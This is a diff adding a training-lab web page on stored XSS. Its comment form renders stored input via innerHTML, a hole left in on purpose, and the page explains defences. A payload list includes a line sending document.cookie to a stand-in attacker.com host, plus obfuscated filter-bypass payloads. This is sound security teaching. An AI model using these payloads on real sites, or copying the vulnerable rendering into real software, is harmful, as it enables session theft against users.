@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Stored XSS Lab - localStorage Based | Bug Bounty Lab</title>
+    <link rel="stylesheet" href="../../css/style.css">
+</head>
+<body>
+    <header>
+        <h1>🎭 Stored XSS Lab</h1>
+        <p class="subtitle">localStorage-Based Persistent XSS</p>
+    </header>
+
+    <div class="lab-container">
+        <div class="lab-section">
+            <h2>What is Stored XSS?</h2>
+            <p>Stored XSS (also called Persistent XSS) is the most dangerous type of XSS. The malicious script is permanently stored on the target server (or in this case, browser storage) and is served to any user who views the affected content.</p>
+            
+            <div class="info-box warning">
+                <h4>⚠️ Vulnerability: localStorage + innerHTML</h4>
+                <p>This lab stores user comments in <code>localStorage</code> and displays them using <code>innerHTML</code>. Any malicious scripts in comments will execute every time the page loads or comments are displayed.</p>
+            </div>
+
+            <h3>🎯 Your Challenge</h3>
+            <p>Post a comment containing malicious JavaScript. Try these payloads:</p>
+            
+            <div class="code-block vulnerable">
+                <code>&lt;img src=x onerror=alert('Stored XSS')&gt;</code>
+            </div>
+            <div class="code-block vulnerable">
+                <code>&lt;script&gt;alert('Stored XSS')&lt;/script&gt;</code>
+            </div>
+            <div class="code-block vulnerable">
+                <code>&lt;svg onload=alert('Stored XSS')&gt;&lt;/svg&gt;</code>
+            </div>
+
+            <p><strong>Note:</strong> The XSS will persist! Try reloading the page after posting a malicious comment.</p>
+        </div>
+
+        <div class="lab-section">
+            <h2>🧪 Post a Comment</h2>
+            
+            <div class="form-group">
+                <label for="commentInput">Your Comment:</label>
+                <textarea id="commentInput" placeholder="Write your comment here..."></textarea>
+            </div>
+
+            <button onclick="postComment()">Post Comment</button>
+            <button class="reset-btn" onclick="clearAllComments()">Clear All Comments</button>
+
+            <h3 style="margin-top: 30px; color: var(--accent-cyan);">💬 Comments (<span id="commentCount">0</span>)</h3>
+            <div id="commentsArea" class="output-area">
+                <p style="color: #888;">No comments yet. Be the first to comment!</p>
+            </div>
+        </div>
+
+        <div class="lab-section">
+            <h2>🔍 How It Works</h2>
+            <p>The vulnerable code stores comments in localStorage and displays them using innerHTML:</p>
+            
+            <div class="code-block vulnerable">
+                <code>
+// ❌ VULNERABLE CODE (Don't use this!)<br>
+<br>
+// Storing the comment<br>
+const comments = JSON.parse(localStorage.getItem('comments') || '[]');<br>
+comments.push({ text: userInput, date: new Date() });<br>
+localStorage.setItem('comments', JSON.stringify(comments));<br>
+<br>
+// Displaying comments<br>
+comments.forEach(comment => {<br>
+&nbsp;&nbsp;&nbsp;&nbsp;commentsArea.innerHTML += '&lt;div&gt;' + comment.text + '&lt;/div&gt;';<br>
+});<br>
+<br>
+// Problem: If comment.text contains malicious HTML/JS, it executes!
+                </code>
+            </div>
+
+            <h3>Why is Stored XSS so dangerous?</h3>
+            <div class="info-box warning">
+                <ul>
+                    <li><strong>Persistent:</strong> The payload stays stored and affects all users</li>
+                    <li><strong>Automatic execution:</strong> Triggers without user interaction</li>
+                    <li><strong>Wide impact:</strong> Can affect many users, not just one</li>
+                    <li><strong>Wormable:</strong> Can propagate itself to other users' data</li>
+                    <li><strong>Hard to detect:</strong> Users may not realize they're compromised</li>
+                </ul>
+            </div>
+
+            <h3>🔒 The Safe Way</h3>
+            <p>Multiple layers of protection are needed:</p>
+            
+            <div class="code-block safe">
+                <code>
+// ✅ SAFE CODE - Multiple protection layers<br>
+<br>
+// 1. Use textContent instead of innerHTML<br>
+const commentDiv = document.createElement('div');<br>
+commentDiv.className = 'comment';<br>
+commentDiv.textContent = comment.text; // Safe!<br>
+commentsArea.appendChild(commentDiv);<br>
+<br>
+// 2. HTML encode if you must use innerHTML<br>
+const safeText = escapeHtml(comment.text);<br>
+commentDiv.innerHTML = safeText;<br>
+<br>
+// 3. Server-side validation (in real apps)<br>
+// - Validate input format<br>
+// - Reject dangerous patterns<br>
+// - Sanitize with DOMPurify or similar<br>
+// - Store sanitized data<br>
+<br>
+// 4. Content Security Policy<br>
+// Add CSP headers to prevent inline scripts
+                </code>
+            </div>
+        </div>
+
+        <div class="lab-section">
+            <h2>🛡️ Defense Strategies</h2>
+            
+            <div class="info-box success">
+                <h4>✅ Input Validation</h4>
+                <ul>
+                    <li>Validate data format and type</li>
+                    <li>Reject unexpected characters</li>
+                    <li>Use allowlists (whitelist), not denylists (blacklist)</li>
+                    <li>Validate on both client and server</li>
+                </ul>
+            </div>
+
+            <div class="info-box success">
+                <h4>✅ Output Encoding</h4>
+                <ul>
+                    <li>HTML encode: Convert &lt; &gt; &amp; " ' to entities</li>
+                    <li>JavaScript encode: Escape special characters</li>
+                    <li>URL encode: Encode URLs properly</li>
+                    <li>Context-aware encoding: Different contexts need different encoding</li>
+                </ul>
+            </div>
+
+            <div class="info-box success">
+                <h4>✅ Content Security Policy (CSP)</h4>
+                <ul>
+                    <li>Block inline JavaScript execution</li>
+                    <li>Restrict script sources to trusted domains</li>
+                    <li>Prevent eval() and similar dangerous functions</li>
+                    <li>Report violations for monitoring</li>
+                </ul>
+            </div>
+
+            <div class="info-box success">
+                <h4>✅ Use Security Libraries</h4>
+                <ul>
+                    <li><strong>DOMPurify:</strong> Sanitize HTML before rendering</li>
+                    <li><strong>js-xss:</strong> JavaScript XSS filtering library</li>
+                    <li><strong>OWASP Java Encoder:</strong> For Java applications</li>
+                    <li><strong>Framework built-ins:</strong> React, Vue, Angular auto-escape</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="lab-section">
+            <h2>📖 Real-World Attack Scenarios</h2>
+            <div class="info-box">
+                <h4>What Attackers Can Do with Stored XSS:</h4>
+                <ul>
+                    <li><strong>Cookie Theft:</strong> Steal session cookies from all users who view the page</li>
+                    <li><strong>Keylogging:</strong> Capture keystrokes on the affected pages</li>
+                    <li><strong>Credential Harvesting:</strong> Inject fake login forms</li>
+                    <li><strong>Malware Distribution:</strong> Redirect users to exploit kits</li>
+                    <li><strong>Defacement:</strong> Modify page content permanently</li>
+                    <li><strong>XSS Worms:</strong> Self-propagating scripts (like Samy worm on MySpace)</li>
+                    <li><strong>Cryptocurrency Mining:</strong> Use victim browsers to mine crypto</li>
+                    <li><strong>Social Engineering:</strong> Display fake messages/alerts</li>
+                </ul>
+            </div>
+
+            <div class="info-box warning">
+                <h4>🎯 Common Stored XSS Locations</h4>
+                <ul>
+                    <li>User profile pages (name, bio, signature)</li>
+                    <li>Comment sections and forums</li>
+                    <li>Product reviews</li>
+                    <li>Support tickets and messages</li>
+                    <li>File upload names and metadata</li>
+                    <li>Form submissions stored in database</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="lab-section">
+            <h2>🔬 Testing for Stored XSS</h2>
+            <div class="code-block">
+                <code>
+<strong>Basic Test Payloads:</strong><br>
+&lt;script&gt;alert('XSS')&lt;/script&gt;<br>
+&lt;img src=x onerror=alert('XSS')&gt;<br>
+&lt;svg onload=alert('XSS')&gt;<br>
+<br>
+<strong>Advanced Payloads:</strong><br>
+&lt;img src=x onerror="fetch('https://attacker.com?c='+document.cookie)"&gt;<br>
+&lt;iframe src="javascript:alert('XSS')"&gt;<br>
+&lt;body onload=alert('XSS')&gt;<br>
+<br>
+<strong>Bypasses for Filters:</strong><br>
+&lt;ScRiPt&gt;alert('XSS')&lt;/sCriPt&gt; (case variation)<br>
+&lt;img src="x" onerror="eval(atob('YWxlcnQoJ1hTUycpOw=='))"&gt; (base64)<br>
+&lt;svg&gt;&lt;script&gt;alert&amp;#40;'XSS'&amp;#41;&lt;/script&gt; (HTML entities)
+                </code>
+            </div>
+        </div>
+
+        <div class="lab-section">
+            <h2>🚀 Next Steps</h2>
+            <p>Continue your security learning journey:</p>
+            <a href="reflected.html" class="btn">← Reflected XSS Lab</a>
+            <a href="dom.html" class="btn">← DOM-based XSS Lab</a>
+            <a href="../sqli/simulator.html" class="btn">SQL Injection Lab →</a>
+            <a href="../../index.html" class="btn reset-btn">← Back to Home</a>
+        </div>
+    </div>
+
+    <footer>
+        <p><strong>⚠️ Educational Purpose Only</strong></p>
+        <p>Never test XSS on real websites without permission</p>
+    </footer>
+
+    <script src="../../js/common.js"></script>
+    <script>
+        // Add breadcrumb navigation
+        document.addEventListener('DOMContentLoaded', function() {
+            createBreadcrumb([
+                { text: 'Home', url: '../../index.html' },
+                { text: 'XSS Labs', url: '#' },
+                { text: 'Stored XSS', url: '#' }
+            ]);
+
+            // Load existing comments on page load
+            loadComments();
+        });
+
+        // ❌ VULNERABLE FUNCTION - Demonstrates Stored XSS
+        function postComment() {
+            const input = document.getElementById('commentInput');
+            const userInput = input.value.trim();
+
+            if (!userInput) {
+                showNotification('Please enter a comment!', 'error');
+                return;
+            }
+
+            // Get existing comments from localStorage
+            let comments = JSON.parse(localStorage.getItem('xss_comments') || '[]');
+
+            // Store the comment with timestamp (THIS STORES THE XSS PAYLOAD!)
+            const comment = {
+                text: userInput,
+                date: formatTimestamp(),
+                id: Date.now()
+            };
+            
+            comments.push(comment);
+            localStorage.setItem('xss_comments', JSON.stringify(comments));
+
+            // Clear input
+            input.value = '';
+
+            // Reload comments to display the new one
+            loadComments();
+
+            showNotification('Comment posted!', 'success');
+        }
+
+        // ❌ VULNERABLE FUNCTION - Uses innerHTML to display comments
+        function loadComments() {
+            const commentsArea = document.getElementById('commentsArea');
+            const commentCount = document.getElementById('commentCount');
+            
+            // Get comments from localStorage
+            const comments = JSON.parse(localStorage.getItem('xss_comments') || '[]');
+            
+            commentCount.textContent = comments.length;
+
+            if (comments.length === 0) {
+                commentsArea.innerHTML = '<p style="color: #888;">No comments yet. Be the first to comment!</p>';
+                return;
+            }
+
+            // THIS IS THE VULNERABILITY!
+            // Using innerHTML with stored user data allows persistent XSS
+            let html = '';
+            comments.forEach(comment => {
+                html += `
+                    <div class="comment">
+                        <div class="comment-meta">${escapeHtml(comment.date)}</div>
+                        <div class="comment-content">${comment.text}</div>
+                    </div>
+                `;
+                // Note: comment.date is escaped, but comment.text is NOT!
+                // Any malicious script in comment.text will execute
+            });
+
+            commentsArea.innerHTML = html;
+
+            // ✅ SAFE ALTERNATIVE (commented out):
+            /*
+            commentsArea.innerHTML = '';
+            comments.forEach(comment => {
+                const commentDiv = document.createElement('div');
+                commentDiv.className = 'comment';
+                
+                const metaDiv = document.createElement('div');
+                metaDiv.className = 'comment-meta';
+                metaDiv.textContent = comment.date;
+                
+                const contentDiv = document.createElement('div');
+                contentDiv.className = 'comment-content';
+                contentDiv.textContent = comment.text; // Safe! Treats as text
+                
+                commentDiv.appendChild(metaDiv);
+                commentDiv.appendChild(contentDiv);
+                commentsArea.appendChild(commentDiv);
+            });
+            */
+        }
+
+        function clearAllComments() {
+            if (confirm('Are you sure you want to delete all comments?')) {
+                localStorage.removeItem('xss_comments');
+                loadComments();
+                showNotification('All comments cleared!', 'info');
+            }
+        }
+
+        // Allow Enter to submit (Ctrl+Enter for line break)
+        document.getElementById('commentInput').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter' && !e.ctrlKey && !e.shiftKey) {
+                e.preventDefault();
+                postComment();
+            }
+        });
+    </script>
+</body>
+</html>
